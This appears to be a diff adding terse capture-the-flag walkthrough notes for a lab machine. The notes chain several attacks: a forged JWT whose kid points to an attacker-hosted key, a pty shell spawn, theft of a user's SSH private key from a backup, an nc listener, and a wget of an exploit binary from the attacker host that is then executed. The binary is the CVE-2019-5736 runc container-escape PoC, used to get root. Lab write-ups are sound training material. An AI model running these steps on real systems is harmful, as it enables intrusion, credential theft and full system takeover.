@@ -1,0 +1,32 @@
+go to 80
+register
+see jwt token
+see kid and admin_cap parameters
+use create-jwt-token.py
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNi4xNzo3MDcwL3ByaXZLZXkua2V5In0.eyJ1c2VybmFtZSI6Im1pbmQiLCJlbWFpbCI6Im1pbmRAaHRiLmNvbSIsImFkbWluX2NhcCI6dHJ1ZX0.PIISgTHbrihIVTXBPD4EgYqu6e4pazzDq-Dw11HdHb3OrvkSGAGgTW50jFdD1CHHNIl1ASIvP8WbbYzofZAFzbzaIBShXPlBN9IINWhCfcalxY_qpzai3XBX8Z61-TsI_3SOgCMg1Z60Unn-GDTem4oXWvQCJi0STCcMXvKQ6vfc6IvKQjs8W6Yz8MnHtY-51PjmEWcmPunt_ZAdVjCw7KDusO5-Yl-cNdeURaZtkIEAp-Jnpw-0cXAdRPuo9oqXpHY2FdSubJm_X75vbdKG897wyb98EPNulLQJ4qM0YYOGESAdmeYGqf2d2ZP2Or9RlrPsv2-3uyqXArijzE6g0FLa_Knb9SnUQIjCRHxN-Mju8qs4MmHtkQgd4Acf8hujqF6aPDPiXOPl4-LU_1LzA0XMsO5E-OyOdXcu3SajhGFaZccSKwJbBAQzc1syiaEuEDp7BvdojNX2RHTNIsSQ6L2MFjXAHDmXs_vC39QNdT4cu-m82L-2tZ9hd9yNErqsRA-n9VLtaKMN07jcjmE_NzxQXO0t-xHBm6AGQRb0YHktRH-BQbPJcmIIDtRF58pdgKzPN86dhmOFfOklis5XN52q6EpuQVKc8bl4SSz1--g108hCWvgEcxFmNbDDdno9O5jGmeLqVtFecVwtjfx07cBDtXSxcv_Dvv34sVSFR30
+
+access /admin
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+xtract home.tar.gz in /var/backups/
+get noah id-rsa
+ssh into machine
+
+sudo -l
+docker --version
+https://github.com/Frichetten/CVE-2019-5736-PoC
+go build main.go
+nc -lnvp 35
+open 2 terminals as noah
+1:
+    sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
+    wget http://10.10.16.17/main
+    chmod +x ./main
+    ./main
+2:
+    sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
+get root!
+
+
+
